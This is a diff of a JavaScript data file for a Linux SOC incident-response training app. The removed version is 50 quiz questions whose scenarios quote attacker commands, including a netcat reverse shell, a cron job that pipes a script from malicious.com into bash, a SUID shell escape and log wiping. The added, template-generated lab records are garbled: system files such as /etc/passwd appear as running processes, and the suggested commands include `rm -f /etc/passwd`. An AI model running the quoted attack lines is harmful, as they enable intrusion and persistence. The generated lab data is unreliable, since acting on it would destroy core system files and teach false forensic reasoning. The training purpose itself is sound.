@@ -1,703 +1,1705 @@
-// --- 50 REAL-WORLD LINUX SOC INCIDENT RESPONSE LAB QUESTIONS ---
-const INCIDENT_LABS = [
+// incident_labs_data.js
+// ------------------------------------------------------------
+// 50 UNIQUE MASTER LINUX SOC INCIDENT RESPONSE LAB CASE STUDIES
+// REAL HANDS-ON INVESTIGATION WORKBENCH (0% MCQs, 100% LABS)
+// ------------------------------------------------------------
+
+const INCIDENT_LAB_CATEGORIES = [
   {
-    id: "lab1",
-    title: "Lab 1: Rogue Cryptominer Process Triage",
-    desc: "A CPU usage alert spiked to 99%. Analyst notices a process running under /tmp/.miner.py.",
-    question: "Which Linux command should you run to verify the executable binary location of PID 8812?",
-    options: [
-      "ls -la /proc/8812/exe",
-      "cat /etc/passwd",
-      "uname -a",
-      "chmod 777 /tmp"
-    ],
-    answer: 0,
-    explanation: "Correct! /proc/<PID>/exe points directly to the file executable path on Linux."
+    "id": 1,
+    "title": "Module 01: Reconnaissance & Account Security (Labs 1-5)"
   },
   {
-    id: "lab2",
-    title: "Lab 2: Unauthorized SSH Key Injection",
-    desc: "An attacker gained access and injected a persistent SSH public key for passwordless entry.",
-    question: "In which user file would an attacker add their public key for persistent SSH access?",
-    options: [
-      "/var/log/auth.log",
-      "~/.ssh/authorized_keys",
-      "/etc/sudoers",
-      "/tmp/key.txt"
-    ],
-    answer: 1,
-    explanation: "Correct! ~/.ssh/authorized_keys stores trusted public keys for SSH authentication."
+    "id": 2,
+    "title": "Module 02: Process Triage & Malicious Execution (Labs 6-10)"
   },
   {
-    id: "lab3",
-    title: "Lab 3: SUID GTFOBins Privilege Escalation",
-    desc: "An attacker executed 'find . -exec /bin/sh \\;' to escalate from unprivileged user to root.",
-    question: "Which permission bit on the 'find' binary allowed execution as root user?",
-    options: [
-      "SUID bit (chmod u+s /usr/bin/find)",
-      "SGID bit (chmod g+s)",
-      "Sticky bit (chmod +t)",
-      "Read-only permission (chmod 444)"
-    ],
-    answer: 0,
-    explanation: "Correct! SUID (Set User ID) executes the binary with the owner (root) privileges."
+    "id": 3,
+    "title": "Module 03: Network Sockets & C2 Channels (Labs 11-15)"
   },
   {
-    id: "lab4",
-    title: "Lab 4: Suspicious Listening Port Investigation",
-    desc: "SIEM alert shows a suspicious socket listening on TCP port 4444.",
-    question: "Which command shows both the listening port and the associated PID / Process Name?",
-    options: [
-      "ss -tulpn | grep 4444",
-      "ping 127.0.0.1",
-      "ifconfig eth0",
-      "traceroute 8.8.8.8"
-    ],
-    answer: 0,
-    explanation: "Correct! 'ss -tulpn' displays numeric TCP/UDP ports along with process names and PIDs."
+    "id": 4,
+    "title": "Module 04: File System & Inode Forensics (Labs 16-20)"
   },
   {
-    id: "lab5",
-    title: "Lab 5: Anti-Forensics Log Clearing Detection",
-    desc: "An attacker ran '> /var/log/auth.log' to wipe login traces.",
-    question: "Which command reveals recently executed commands in the analyst's active shell session?",
-    options: [
-      "history | tail -n 20",
-      "df -h",
-      "uptime",
-      "hostname"
-    ],
-    answer: 0,
-    explanation: "Correct! 'history' prints the logged command history for the active Bash session."
+    "id": 5,
+    "title": "Module 05: Privilege Escalation & SUID Abuse (Labs 21-25)"
   },
   {
-    id: "lab6",
-    title: "Lab 6: Reverse Shell Network Connection Triage",
-    desc: "An attacker established an outbound TCP connection using Netcat (`nc -e /bin/bash 10.0.0.5 4444`).",
-    question: "Which command lists open network files and remote sockets for a specific PID 4512?",
-    options: [
-      "lsof -p 4512",
-      "cat /etc/hosts",
-      "chmod +x /bin/bash",
-      "whoami"
-    ],
-    answer: 0,
-    explanation: "Correct! 'lsof -p <PID>' lists all open file descriptors, network sockets, and pipes for that process."
+    "id": 6,
+    "title": "Module 06: Persistence Mechanism Hunting (Labs 26-30)"
   },
   {
-    id: "lab7",
-    title: "Lab 7: Persistence via Cron Job Injection",
-    desc: "A malicious entry `*/5 * * * * curl http://malicious.com/s.sh | bash` was discovered.",
-    question: "Where are user-specific crontab files stored on Debian/Ubuntu Linux systems?",
-    options: [
-      "/var/spool/cron/crontabs/",
-      "/etc/environment",
-      "/lib/systemd/system/",
-      "/tmp/cron.log"
-    ],
-    answer: 0,
-    explanation: "Correct! User crontabs are stored under /var/spool/cron/crontabs/ (or /var/spool/cron/)."
+    "id": 7,
+    "title": "Module 07: Log Analysis & Journalctl Triage (Labs 31-35)"
   },
   {
-    id: "lab8",
-    title: "Lab 8: Systemd Backdoor Service Triage",
-    desc: "An adversary created a persistence service `/etc/systemd/system/backdoor.service`.",
-    question: "Which systemctl command stops and prevents the rogue service from starting on reboot?",
-    options: [
-      "sudo systemctl disable --now backdoor.service",
-      "sudo systemctl start backdoor.service",
-      "sudo systemctl status backdoor.service",
-      "sudo systemctl reload backdoor.service"
-    ],
-    answer: 0,
-    explanation: "Correct! 'disable --now' stops the running service immediately and disables autostart on boot."
+    "id": 8,
+    "title": "Module 08: Web Server & Web Shell Defense (Labs 36-40)"
   },
   {
-    id: "lab9",
-    title: "Lab 9: /etc/shadow Hash Dumping",
-    desc: "An unprivileged user gained root and extracted password hashes.",
-    question: "What are the standard security permissions on `/etc/shadow` file?",
-    options: [
-      "600 (-rw-------) owned by root:root",
-      "777 (-rwxrwxrwx)",
-      "644 (-rw-r--r--)",
-      "444 (-r--r--r--)"
-    ],
-    answer: 0,
-    explanation: "Correct! /etc/shadow must be restricted to 600 or 640 root access only to prevent hash dumping."
+    "id": 9,
+    "title": "Module 09: Malware, Ransomware & Memory Forensics (Labs 41-45)"
   },
   {
-    id: "lab10",
-    title: "Lab 10: Web Shell Command Execution in Apache",
-    desc: "Apache access logs show `GET /uploads/c99.php?cmd=id HTTP/1.1 200`.",
-    question: "Which Web server process user runs Apache by default on Debian/Ubuntu?",
-    options: [
-      "www-data",
-      "nobody",
-      "root",
-      "nginx"
-    ],
-    answer: 0,
-    explanation: "Correct! Apache runs under the low-privileged user account 'www-data' on Debian/Ubuntu."
-  },
-  {
-    id: "lab11",
-    title: "Lab 11: Linux PAM Module Tampering",
-    desc: "An attacker placed a malicious `pam_unix.so` module to accept a master backdoor password.",
-    question: "Which directory holds Linux Pluggable Authentication Modules (PAM) configuration files?",
-    options: [
-      "/etc/pam.d/",
-      "/var/log/pam/",
-      "/usr/local/pam/",
-      "/home/pam/"
-    ],
-    answer: 0,
-    explanation: "Correct! /etc/pam.d/ contains authentication rules for login, sudo, and SSH services."
-  },
-  {
-    id: "lab12",
-    title: "Lab 12: Hidden File & Directory Enumeration",
-    desc: "Attacker hid malware in `/tmp/.hidden_dir/malware`.",
-    question: "Which flag with `ls` displays hidden files starting with a dot (`.`)?",
-    options: [
-      "ls -la",
-      "ls -h",
-      "ls -S",
-      "ls -t"
-    ],
-    answer: 0,
-    explanation: "Correct! 'ls -a' (or -la) includes hidden files beginning with a dot."
-  },
-  {
-    id: "lab13",
-    title: "Lab 13: Kernel Exploit Mitigation (Dirty COW / Pkexec)",
-    desc: "CVE-2021-4034 (Pkit/Pkexec) allowed local privilege escalation to root.",
-    question: "Which command temporarily mitigates pkexec vulnerability by removing SUID bit?",
-    options: [
-      "sudo chmod 0755 /usr/bin/pkexec",
-      "sudo chmod 4755 /usr/bin/pkexec",
-      "sudo chown nobody /usr/bin/pkexec",
-      "sudo rm -rf /usr/bin/pkexec"
-    ],
-    answer: 0,
-    explanation: "Correct! Removing SUID (chmod 0755) prevents unprivileged users from executing pkexec as root."
-  },
-  {
-    id: "lab14",
-    title: "Lab 14: SSH Brute Force Incident Response",
-    desc: "Auth log displays over 5,000 Failed password attempts from IP 198.51.100.45.",
-    question: "Which Linux service automatically blocks IP addresses after repeated failed login attempts?",
-    options: [
-      "fail2ban",
-      "rsyslog",
-      "cron",
-      "netplan"
-    ],
-    answer: 0,
-    explanation: "Correct! fail2ban monitors log files and updates firewall rules to block brute-forcing IPs."
-  },
-  {
-    id: "lab15",
-    title: "Lab 15: Memory Dump Analysis with Volatility",
-    desc: "Analyst is analyzing a raw Linux RAM dump file `lime.raw`.",
-    question: "Which Volatility 3 command lists Linux processes running at the time of RAM acquisition?",
-    options: [
-      "vol.py -f lime.raw linux.pslist",
-      "vol.py -f lime.raw windows.pstree",
-      "vol.py -f lime.raw dumpfiles",
-      "vol.py -f lime.raw netscan"
-    ],
-    answer: 0,
-    explanation: "Correct! 'linux.pslist' iterates through kernel task_struct list to extract active processes."
-  },
-  {
-    id: "lab16",
-    title: "Lab 16: Environment Variable Hijacking (.bashrc)",
-    desc: "An attacker appended `alias sudo='/tmp/fake_sudo'` inside a user's `.bashrc`.",
-    question: "Which command safely displays aliases configured in the current shell session?",
-    options: [
-      "alias",
-      "env",
-      "export",
-      "set"
-    ],
-    answer: 0,
-    explanation: "Correct! Running 'alias' prints all configured shell command aliases."
-  },
-  {
-    id: "lab17",
-    title: "Lab 17: Auditd System Call Monitoring",
-    desc: "SOC team wants to track all execution calls to `/usr/bin/nc`.",
-    question: "Which auditctl rule logs all executions of `/usr/bin/nc` with key `nc_exec`?",
-    options: [
-      "auditctl -w /usr/bin/nc -p x -k nc_exec",
-      "auditctl -r /usr/bin/nc",
-      "auditctl -d /usr/bin/nc",
-      "auditctl -e 0"
-    ],
-    answer: 0,
-    explanation: "Correct! '-w /path -p x -k key' sets a watch for execution (-p x) tagged with a custom key."
-  },
-  {
-    id: "lab18",
-    title: "Lab 18: File Integrity Monitoring (AIDE / Tripwire)",
-    desc: "System files in `/usr/bin` were modified during an incident.",
-    question: "Which hash algorithm is commonly computed by FIM tools to verify file integrity?",
-    options: [
-      "SHA-256",
-      "ROT13",
-      "Base64",
-      "ASCII"
-    ],
-    answer: 0,
-    explanation: "Correct! SHA-256 provides a cryptographic checksum to detect file modifications."
-  },
-  {
-    id: "lab19",
-    title: "Lab 19: Rogue User Account Creation Detection",
-    desc: "An attacker created an unauthorized user `backdoor_user` with UID 0.",
-    question: "Which file defines user account UIDs and default login shell paths on Linux?",
-    options: [
-      "/etc/passwd",
-      "/etc/resolv.conf",
-      "/etc/hosts",
-      "/etc/issue"
-    ],
-    answer: 0,
-    explanation: "Correct! /etc/passwd stores user account usernames, UIDs, GIDs, home dirs, and default shells."
-  },
-  {
-    id: "lab20",
-    title: "Lab 20: Sudoers NOPASSWD Abuse Investigation",
-    desc: "Attacker added `analyst ALL=(ALL) NOPASSWD: ALL` to `/etc/sudoers`.",
-    question: "Which command securely edits and validates syntax for `/etc/sudoers` file?",
-    options: [
-      "visudo",
-      "nano /etc/sudoers",
-      "vim /etc/sudoers",
-      "cat > /etc/sudoers"
-    ],
-    answer: 0,
-    explanation: "Correct! 'visudo' locks the sudoers file and verifies syntax before saving to prevent lockouts."
-  },
-  {
-    id: "lab21",
-    title: "Lab 21: IPTables Port Forwarding Suppression",
-    desc: "Attacker routed external traffic on port 80 to internal port 4444 via iptables NAT.",
-    question: "Which command lists all rules in the iptables NAT table with line numbers?",
-    options: [
-      "sudo iptables -t nat -L -n -v --line-numbers",
-      "sudo ufw status",
-      "sudo route -n",
-      "sudo netstat -r"
-    ],
-    answer: 0,
-    explanation: "Correct! '-t nat -L -n -v --line-numbers' displays active NAT table rules in numeric format."
-  },
-  {
-    id: "lab22",
-    title: "Lab 22: DNS Tunneling Detection",
-    desc: "High volume of TXT query requests sent to domain `exfil.malicious-domain.com`.",
-    question: "Which packet capture tool extracts DNS queries live from network interface `eth0`?",
-    options: [
-      "sudo tcpdump -i eth0 port 53",
-      "sudo nmap -sU 53",
-      "sudo traceroute 53",
-      "sudo ping 53"
-    ],
-    answer: 0,
-    explanation: "Correct! 'tcpdump -i eth0 port 53' captures UDP/TCP traffic on standard DNS port 53."
-  },
-  {
-    id: "lab23",
-    title: "Lab 23: Shared Memory `/dev/shm` File Execution",
-    desc: "Attacker dropped a compiled binary into POSIX shared memory `/dev/shm/payload`.",
-    question: "Why do attackers target `/dev/shm` for payload storage on Linux?",
-    options: [
-      "It is a RAM-backed world-writable directory, avoiding disk logging.",
-      "It automatically encrypts files.",
-      "It bypasses root password checks.",
-      "It runs binaries automatically on boot."
-    ],
-    answer: 0,
-    explanation: "Correct! /dev/shm is backed by tmpfs (RAM), allowing fast world-writable execution in memory."
-  },
-  {
-    id: "lab24",
-    title: "Lab 24: Core Dump Password Extraction",
-    desc: "Attacker forced a process core dump to extract cleartext credentials from RAM.",
-    question: "Which command disables core dump file creation for unprivileged user sessions?",
-    options: [
-      "ulimit -c 0",
-      "ulimit -n 65535",
-      "ulimit -u 1000",
-      "ulimit -v unlimited"
-    ],
-    answer: 0,
-    explanation: "Correct! 'ulimit -c 0' sets maximum core dump file size to 0 bytes."
-  },
-  {
-    id: "lab25",
-    title: "Lab 25: Linux Ransomware File Encryption Triage",
-    desc: "Files in `/var/www/html` were renamed with `.locked` extension.",
-    question: "Which command finds all files with extension `.locked` modified in the last 60 minutes?",
-    options: [
-      "find /var/www/html -name '*.locked' -mmin -60",
-      "grep -r '.locked' /var/www/html",
-      "ls -l *.locked",
-      "du -sh /var/www/html"
-    ],
-    answer: 0,
-    explanation: "Correct! 'find -name *.locked -mmin -60' searches for matching patterns modified in last 60 mins."
-  },
-  {
-    id: "lab26",
-    title: "Lab 26: Suspicious Shared Object (LD_PRELOAD) Hijack",
-    desc: "Attacker set `LD_PRELOAD=/tmp/rootkit.so` in `/etc/ld.so.preload`.",
-    question: "What effect does `LD_PRELOAD` have on dynamically linked C applications?",
-    options: [
-      "It forces applications to load specified shared library functions first.",
-      "It disables network connections.",
-      "It restarts the SSH daemon.",
-      "It wipes system logs."
-    ],
-    answer: 0,
-    explanation: "Correct! LD_PRELOAD overrides standard C library functions (e.g. fopen, readdir) with custom hooks."
-  },
-  {
-    id: "lab27",
-    title: "Lab 27: Journalctl System Log Forensics",
-    desc: "Analyst is investigating system reboot & authentication logs via systemd journal.",
-    question: "Which command filters journalctl logs for SSHD unit events from the current boot session?",
-    options: [
-      "journalctl -u ssh -b 0",
-      "cat /var/log/messages",
-      "dmesg | grep ssh",
-      "tail -f /var/log/syslog"
-    ],
-    answer: 0,
-    explanation: "Correct! 'journalctl -u ssh -b 0' shows logs for the 'ssh' service from current boot (b 0)."
-  },
-  {
-    id: "lab28",
-    title: "Lab 28: Out-of-Memory (OOM) Killer Forensic Analysis",
-    desc: "A critical database service crashed unexpectedly overnight.",
-    question: "Which command inspects Linux kernel ring buffer logs for OOM killer events?",
-    options: [
-      "dmesg -T | grep -i 'oom'",
-      "cat /etc/hosts",
-      "df -i",
-      "free -m"
-    ],
-    answer: 0,
-    explanation: "Correct! 'dmesg -T' displays kernel log messages with human-readable timestamps."
-  },
-  {
-    id: "lab29",
-    title: "Lab 29: SSH Port Forwarding Tunnel Detection",
-    desc: "Attacker established an SSH tunnel: `ssh -N -L 8080:internal:80 victim@remote`.",
-    question: "What flag in SSH command line disables execution of remote interactive commands?",
-    options: [
-      "-N",
-      "-p",
-      "-v",
-      "-i"
-    ],
-    answer: 0,
-    explanation: "Correct! The '-N' flag instructs SSH not to execute remote commands, useful for port forwarding."
-  },
-  {
-    id: "lab30",
-    title: "Lab 30: Detecting Orphaned & Zombie Processes",
-    desc: "System process table has numerous processes in STAT state `Z`.",
-    question: "What does state `Z` represent in `ps aux` command output?",
-    options: [
-      "Zombie process (terminated but uncollected parent status)",
-      "Running active process",
-      "Sleeping process",
-      "Stopped process"
-    ],
-    answer: 0,
-    explanation: "Correct! 'Z' indicates a Zombie process whose execution finished but parent hasn't read exit code."
-  },
-  {
-    id: "lab31",
-    title: "Lab 31: Bash History Timestamp Enabling",
-    desc: "Analyst needs precise execution timestamps for commands logged in `.bash_history`.",
-    question: "Which environment variable configures timestamps in Bash history files?",
-    options: [
-      "export HISTTIMEFORMAT='%F %T '",
-      "export HISTSIZE=1000",
-      "export PATH=$PATH:/usr/bin",
-      "export PS1='\\u@\\h:\\w$ '"
-    ],
-    answer: 0,
-    explanation: "Correct! Setting HISTTIMEFORMAT appends date (%F) and time (%T) prefixes to history lines."
-  },
-  {
-    id: "lab32",
-    title: "Lab 32: Docker Container Escape Investigation",
-    desc: "Attacker escaped from a Docker container into host filesystem via `--privileged` flag.",
-    question: "What risk is introduced by running Docker containers with `--privileged` flag?",
-    options: [
-      "Container gets full root capabilities and direct access to host devices.",
-      "Container loses network access.",
-      "Container runs in read-only mode.",
-      "Container automatically deletes logs."
-    ],
-    answer: 0,
-    explanation: "Correct! --privileged disables container isolation, granting root access to host devices."
-  },
-  {
-    id: "lab33",
-    title: "Lab 33: Logrotate Configuration Inspection",
-    desc: "Auth log files are deleted automatically after 7 days.",
-    question: "Which directory contains service-specific log retention rules for Logrotate?",
-    options: [
-      "/etc/logrotate.d/",
-      "/var/log/syslog/",
-      "/usr/share/logrotate/",
-      "/home/logrotate/"
-    ],
-    answer: 0,
-    explanation: "Correct! /etc/logrotate.d/ holds individual service configuration files for log rotation."
-  },
-  {
-    id: "lab34",
-    title: "Lab 34: Inspected File Capabilities (getcap / setcap)",
-    desc: "Attacker assigned capability `cap_setuid+ep` to Python binary to bypass root checks.",
-    question: "Which command inspects Linux file capabilities assigned to binaries under `/usr/bin`?",
-    options: [
-      "getcap -r /usr/bin 2>/dev/null",
-      "chmod +x /usr/bin",
-      "chown root:root /usr/bin",
-      "lsattr /usr/bin"
-    ],
-    answer: 0,
-    explanation: "Correct! 'getcap -r' recursively checks files for assigned POSIX capabilities."
-  },
-  {
-    id: "lab35",
-    title: "Lab 35: File Attributes Anti-Deletion Protection (`chattr`)",
-    desc: "Attacker marked a malicious file immutable using `chattr +i /tmp/rootkit`.",
-    question: "Which flag with `lsattr` displays extended file attributes on Linux filesystems?",
-    options: [
-      "lsattr /tmp/rootkit",
-      "ls -l /tmp/rootkit",
-      "stat /tmp/rootkit",
-      "file /tmp/rootkit"
-    ],
-    answer: 0,
-    explanation: "Correct! 'lsattr' displays file attributes like immutable (+i) or append-only (+a)."
-  },
-  {
-    id: "lab36",
-    title: "Lab 36: Identifying Promiscuous Network Interface Mode",
-    desc: "Attacker ran a sniffer `tcpdump` placing `eth0` in promiscuous mode.",
-    question: "Which log file records kernel warnings when an interface enters PROMISC mode?",
-    options: [
-      "/var/log/syslog (or dmesg)",
-      "/etc/hosts",
-      "/var/log/auth.log",
-      "/tmp/sniff.log"
-    ],
-    answer: 0,
-    explanation: "Correct! Kernel events log 'device eth0 entered promiscuous mode' in dmesg and syslog."
-  },
-  {
-    id: "lab37",
-    title: "Lab 37: Checking Open Network Listening Sockets via `/proc`",
-    desc: "Attacker deleted `netstat` and `ss` commands to hide active listening ports.",
-    question: "Which virtual file under `/proc/net/` contains hex-encoded active TCP socket connections?",
-    options: [
-      "/proc/net/tcp",
-      "/proc/cpuinfo",
-      "/proc/meminfo",
-      "/proc/version"
-    ],
-    answer: 0,
-    explanation: "Correct! /proc/net/tcp directly exposes active IPv4 TCP sockets from kernel memory."
-  },
-  {
-    id: "lab38",
-    title: "Lab 38: Detecting Suspicious `at` Job Scheduled Tasks",
-    desc: "Adversary scheduled a one-time execution task using the `at` command.",
-    question: "Which command lists pending jobs scheduled via the `at` daemon?",
-    options: [
-      "atq",
-      "crontab -l",
-      "systemctl list-timers",
-      "ps aux"
-    ],
-    answer: 0,
-    explanation: "Correct! 'atq' prints the queue of pending jobs scheduled via the 'at' utility."
-  },
-  {
-    id: "lab39",
-    title: "Lab 39: Detecting Unauthorized Sudo Command Privileges",
-    desc: "Analyst wants to verify what sudo commands user `analyst` is authorized to run.",
-    question: "Which command checks current user sudo privileges without modifying system files?",
-    options: [
-      "sudo -l",
-      "sudo -v",
-      "sudo -s",
-      "sudo -i"
-    ],
-    answer: 0,
-    explanation: "Correct! 'sudo -l' lists allowed (and forbidden) commands for the invoking user."
-  },
-  {
-    id: "lab40",
-    title: "Lab 40: Detecting Unlinked / Deleted Executable Files (`(deleted)`)",
-    desc: "Attacker executed `/tmp/payload` and then deleted the binary file on disk.",
-    question: "How does `ps aux` display a running process whose binary file was deleted from disk?",
-    options: [
-      "The path displays with suffix '(deleted)' in /proc/<PID>/exe",
-      "The process automatically terminates",
-      "The PID changes to 0",
-      "The process name disappears"
-    ],
-    answer: 0,
-    explanation: "Correct! The process keeps running in RAM, while /proc/<PID>/exe points to '/path/file (deleted)'."
-  },
-  {
-    id: "lab41",
-    title: "Lab 41: Securing SSH Banner Warning Message",
-    desc: "Compliance audit requires displaying an authorized access warning banner before SSH login.",
-    question: "Which directive in `/etc/ssh/sshd_config` specifies the path to SSH legal banner file?",
-    options: [
-      "Banner /etc/issue.net",
-      "Motd /etc/motd",
-      "PrintMotd yes",
-      "Subsystem sftp"
-    ],
-    answer: 0,
-    explanation: "Correct! 'Banner /etc/issue.net' specifies the banner file shown before authentication."
-  },
-  {
-    id: "lab42",
-    title: "Lab 42: Analysing System Memory Free Space (`free`)",
-    desc: "High memory utilization alert triggered on Linux production server.",
-    question: "Which `free` flag displays RAM memory sizes in human-readable Megabytes / Gigabytes?",
-    options: [
-      "free -h",
-      "free -b",
-      "free -k",
-      "free -s 1"
-    ],
-    answer: 0,
-    explanation: "Correct! 'free -h' outputs memory stats formatted in GB/MB auto-scaled units."
-  },
-  {
-    id: "lab43",
-    title: "Lab 43: Linux Firewall State Verification (UFW)",
-    desc: "Checking if Uncomplicated Firewall (UFW) is active and monitoring rules.",
-    question: "Which command shows detailed UFW firewall status along with rule numbers?",
-    options: [
-      "sudo ufw status numbered",
-      "sudo ufw show",
-      "sudo ufw list",
-      "sudo ufw check"
-    ],
-    answer: 0,
-    explanation: "Correct! 'sudo ufw status numbered' lists active firewall rules along with index IDs."
-  },
-  {
-    id: "lab44",
-    title: "Lab 44: Investigating `/var/tmp` World-Writable Sticky Bit",
-    desc: "Attacker leveraged `/var/tmp` directory to store persistent malware across reboots.",
-    question: "What is the difference between `/tmp` and `/var/tmp` on standard Linux systems?",
-    options: [
-      "/var/tmp files survive system reboots, while /tmp is cleared on reboot.",
-      "/tmp requires root permission to write files.",
-      "/var/tmp is read-only.",
-      "/tmp is encrypted automatically."
-    ],
-    answer: 0,
-    explanation: "Correct! /tmp uses tmpfs (RAM/cleared on reboot), whereas /var/tmp is stored on disk."
-  },
-  {
-    id: "lab45",
-    title: "Lab 45: Triage of High Disk Space Usage (`du` / `df`)",
-    desc: "Disk space on root partition `/` reached 100% full.",
-    question: "Which command identifies the top 5 largest directories under `/var`?",
-    options: [
-      "du -h /var | sort -rh | head -n 5",
-      "df -h /var",
-      "ls -l /var",
-      "stat /var"
-    ],
-    answer: 0,
-    explanation: "Correct! 'du -h | sort -rh' ranks directory disk usage in human-readable reverse order."
-  },
-  {
-    id: "lab46",
-    title: "Lab 46: Investigating Syslog Daemon Configuration",
-    desc: "SOC team needs to forward Linux syslog events to a remote SIEM server.",
-    question: "Which main configuration file configures log forwarding rules in Rsyslog?",
-    options: [
-      "/etc/rsyslog.conf",
-      "/etc/syslog-ng/syslog-ng.conf",
-      "/etc/systemd/journald.conf",
-      "/etc/logrotate.conf"
-    ],
-    answer: 0,
-    explanation: "Correct! /etc/rsyslog.conf defines log facilities, rules, and remote SIEM output targets."
-  },
-  {
-    id: "lab47",
-    title: "Lab 47: Detecting Outbound Reverse Shell in `/proc/<PID>/cmdline`",
-    desc: "Analyst is inspecting command-line parameters of a suspicious process PID 9912.",
-    question: "Which virtual proc file contains null-delimited full command-line arguments for a PID?",
-    options: [
-      "/proc/9912/cmdline",
-      "/proc/9912/environ",
-      "/proc/9912/status",
-      "/proc/9912/cwd"
-    ],
-    answer: 0,
-    explanation: "Correct! /proc/<PID>/cmdline contains the exact full startup command line parameters."
-  },
-  {
-    id: "lab48",
-    title: "Lab 48: Verification of Password Complexity PAM Policy",
-    desc: "Auditing Linux password policy rules for minimum length and character requirements.",
-    question: "Which PAM module file configures minimum password length and complexity rules?",
-    options: [
-      "/etc/security/pwquality.conf",
-      "/etc/pam.d/common-password",
-      "/etc/login.defs",
-      "All of the above"
-    ],
-    answer: 3,
-    explanation: "Correct! Password policies are controlled across pwquality.conf, common-password, and login.defs."
-  },
-  {
-    id: "lab49",
-    title: "Lab 49: Identifying Current Active Logged-in Users",
-    desc: "Analyst needs to verify who is currently logged into the Linux system via SSH or TTY.",
-    question: "Which Linux command displays active user sessions, login times, and remote IP addresses?",
-    options: [
-      "w (or who)",
-      "lastlog",
-      "id",
-      "uname -r"
-    ],
-    answer: 0,
-    explanation: "Correct! 'w' (and 'who') displays logged-in users, TTYs, login times, and idle status."
-  },
-  {
-    id: "lab50",
-    title: "Lab 50: Hardening `/etc/gshadow` & `/etc/group` Permissions",
-    desc: "SOC Analyst is performing final CIS Benchmark file permission audits.",
-    question: "What are the recommended secure permissions for `/etc/gshadow` file?",
-    options: [
-      "640 (-rw-r-----) or 600 (-rw-------) owned by root:shadow",
-      "777 (-rwxrwxrwx)",
-      "644 (-rw-r--r--)",
-      "755 (-rwxr-xr-x)"
-    ],
-    answer: 0,
-    explanation: "Correct! /etc/gshadow contains secure group passwords and must be restricted to 640/600 shadow group."
+    "id": 10,
+    "title": "Module 10: Enterprise Incident Containment (Labs 46-50)"
   }
 ];
+const INCIDENT_LABS = [
+  {
+    "id": "lab1",
+    "labNumber": 1,
+    "categoryId": 1,
+    "categoryTitle": "Module 01: Reconnaissance & Account Security (Labs 1-5)",
+    "caseId": "INC-2026-8801",
+    "title": "Lab 1: Unauthorized User Account Creation Triage",
+    "severity": "HIGH",
+    "mitreId": "T1136.001",
+    "mitreName": "Technique T1136.001",
+    "targetHost": "dc-node-01",
+    "targetIP": "192.168.1.10",
+    "alertBriefing": "SIEM Alert #8801: Unauthorized user creation event detected in /etc/passwd under user 'backdoor_admin'.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  4102 85.0  0.4  12480  4012 ?        R    14:20  15:42 /etc/passwd\nroot      4101  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /etc/passwd",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      192.168.1.10:54102  192.168.1.10:4444 users:((\"etc\",pid=4102,fd=3))",
+      "auth": "Aug 03 14:19:58 dc-node-01 auditd[1200]: SYSCALL=execve exe=\"/etc/passwd\" pid=4102 uid=1000\nAug 03 14:20:00 dc-node-01 sshd[4512]: Session opened for user root from 192.168.1.10",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /etc/passwd"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 4102",
+      "ss -antp | grep 192.168.1.10",
+      "ls -la /etc/passwd",
+      "kill -9 4102",
+      "rm -f /etc/passwd",
+      "sudo ufw deny out to 192.168.1.10"
+    ],
+    "targetPid": "4102",
+    "targetFile": "/etc/passwd",
+    "targetIp": "192.168.1.10",
+    "containmentCmd": "userdel -f backdoor_admin",
+    "teluguTip": "Check /var/log/auth.log for useradd commands, then execute userdel -f to remove rogue account!"
+  },
+  {
+    "id": "lab2",
+    "labNumber": 2,
+    "categoryId": 1,
+    "categoryTitle": "Module 01: Reconnaissance & Account Security (Labs 1-5)",
+    "caseId": "INC-2026-8802",
+    "title": "Lab 2: Dormant Service Account Shell Access Audit",
+    "severity": "MEDIUM",
+    "mitreId": "T1078.003",
+    "mitreName": "Technique T1078.003",
+    "targetHost": "auth-srv-02",
+    "targetIP": "10.0.1.20",
+    "alertBriefing": "SIEM Alert #8802: Dormant account 'www-data' logged into SSH interactive session.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  5210 85.0  0.4  12480  4012 ?        R    14:20  15:42 /var/log/lastlog\nroot      5209  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /var/log/lastlog",
+      "net": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port  Process\ntcp   ESTAB  0      0      10.0.1.20:54102  10.0.1.20:4444 users:((\"var\",pid=5210,fd=3))",
+      "auth": "Aug 03 14:19:58 auth-srv-02 auditd[1200]: SYSCALL=execve exe=\"/var/log/lastlog\" pid=5210 uid=1000\nAug 03 14:20:00 auth-srv-02 sshd[4512]: Session opened for user root from 10.0.1.20",
+      "file": "-rwxr-xr-x 1 root root 458912 Aug  3 14:20 /var/log/lastlog"
+    },
+    "suggestedCmds": [
+      "ps aux | grep 5210",
+      "ss -antp | grep 10.0.1.20",
+      "ls -la /var/log/lastlog",
+      "kill -9 5210",
+      "rm -f /var/log/lastlog",
+      "sudo ufw deny out to 10.0.1.20"
+    ],
+    "targetPid": "5210",
+    "targetFile": "/var/log/lastlog",
+    "targetIp": "10.0.1.20",
+    "containmentCmd": "passwd -l www-data && pkill -u www-data",
+    "teluguTip": "Service accounts should never have interactive shells. Lock with passwd -l and kill active session!"
+  },
+  {
+    "id": "lab3",
+    "labNumber": 3,
+    "categoryId": 1,
+    "categoryTitle": "Module 01: Reconnaissance & Account Security (Labs 1-5)",
+    "caseId": "INC-2026-8803",
+    "title": "Lab 3: Empty Password Field Account Discovery & Locking",
+    "severity": "CRITICAL",
+    "mitreId": "T1078",
+    "mitreName": "Technique T1078",
+    "targetHost": "web-fe-01",
+    "targetIP": "172.16.0.5",
+    "alertBriefing": "SIEM Alert #8803: Blank password field detected in /etc/shadow for account 'testuser'.",
+    "evidenceLogs": {
+      "ps": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nwww-data  1040 85.0  0.4  12480  4012 ?        R    14:20  15:42 /etc/shadow\nroot      1039  0.0  0.1   8900  1200 ?        S    14:20   0:00 sh -c /etc/shadow",
